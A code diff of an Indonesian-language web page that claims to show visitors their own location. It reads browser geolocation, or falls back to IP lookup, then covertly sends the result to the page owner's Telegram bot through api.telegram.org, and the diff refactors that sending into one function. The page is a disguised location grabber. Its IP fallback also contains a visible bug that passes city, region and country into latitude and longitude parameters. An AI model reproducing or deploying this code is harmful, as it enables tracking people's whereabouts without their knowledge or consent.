@@ -15,6 +15,7 @@
 <body>
     <h1>Dapatkan Lokasi Anda</h1>
     <p id="location">Sedang memuat lokasi...</p>
+    <button id="goToDodol" style="display:none;">Lihat Lokasi di Dodol.html</button>
 
     <script>
         // Memeriksa apakah browser mendukung Geolocation
@@ -22,24 +23,15 @@
             navigator.geolocation.getCurrentPosition(position => {
                 const { latitude, longitude } = position.coords;
                 document.getElementById('location').innerHTML = `Latitude: ${latitude}, Longitude: ${longitude}`;
+                
+                // Simpan lokasi ke local storage
+                localStorage.setItem('location', JSON.stringify({ latitude, longitude }));
 
                 // Kirim lokasi ke Telegram
-                const chatId = 'YOUR_CHAT_ID'; // Ganti dengan chat ID Anda
-                const token = 'YOUR_BOT_TOKEN'; // Ganti dengan token bot Anda
-                const message = `Lokasi baru telah diakses: Latitude: ${latitude}, Longitude: ${longitude}`;
-
-                // Menggunakan Fetch API untuk mengirim pesan
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-                    .then(response => {
-                        if (response.ok) {
-                            console.log("Pesan terkirim ke Telegram.");
-                        } else {
-                            console.error("Gagal mengirim pesan ke Telegram.");
-                        }
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                    });
+                sendLocationToTelegram(latitude, longitude);
+                
+                // Tampilkan tombol untuk pergi ke dodol.html
+                document.getElementById('goToDodol').style.display = 'block';
             }, error => {
                 console.error('Error getting location:', error);
                 getLocationByIP(); // Jika gagal, ambil lokasi berdasarkan IP
@@ -56,30 +48,48 @@
                 .then(data => {
                     const { city, region, country } = data;
                     document.getElementById('location').innerHTML = `Kota: ${city}, Wilayah: ${region}, Negara: ${country}`;
+                    
+                    // Simpan lokasi berdasarkan IP ke local storage
+                    localStorage.setItem('location', JSON.stringify({ city, region, country }));
 
                     // Kirim lokasi ke Telegram
-                    const chatId = 'YOUR_CHAT_ID'; // Ganti dengan chat ID Anda
-                    const token = 'YOUR_BOT_TOKEN'; // Ganti dengan token bot Anda
-                    const message = `Lokasi berdasarkan IP: Kota: ${city}, Wilayah: ${region}, Negara: ${country}`;
-
-                    // Menggunakan Fetch API untuk mengirim pesan
-                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-                        .then(response => {
-                            if (response.ok) {
-                                console.log("Pesan terkirim ke Telegram.");
-                            } else {
-                                console.error("Gagal mengirim pesan ke Telegram.");
-                            }
-                        })
-                        .catch(error => {
-                            console.error('Error:', error);
-                        });
+                    sendLocationToTelegram(city, region, country);
+                    
+                    // Tampilkan tombol untuk pergi ke dodol.html
+                    document.getElementById('goToDodol').style.display = 'block';
                 })
                 .catch(error => {
                     document.getElementById('location').innerHTML = "Terjadi kesalahan saat mengambil lokasi.";
                     console.error('Error:', error);
                 });
         }
+
+        // Fungsi untuk mengirim lokasi ke Telegram
+        function sendLocationToTelegram(latitude, longitude) {
+            const chatId = 'YOUR_CHAT_ID'; // Ganti dengan chat ID Anda
+            const token = 'YOUR_BOT_TOKEN'; // Ganti dengan token bot Anda
+            const message = `Lokasi baru telah diakses: Latitude: ${latitude}, Longitude: ${longitude}`;
+            
+            // Menggunakan Fetch API untuk mengirim pesan
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => {
+                    if (response.ok) {
+                        console.log("Pesan terkirim ke Telegram.");
+                    } else {
+                        return response.json().then(err => {
+                            console.error("Gagal mengirim pesan ke Telegram:", err);
+                        });
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        }
+
+        // Event listener untuk tombol pergi ke dodol.html
+        document.getElementById('goToDodol').addEventListener('click', () => {
+            window.location.href = 'dodol.html';
+        });
     </script>
 </body>
 </html>
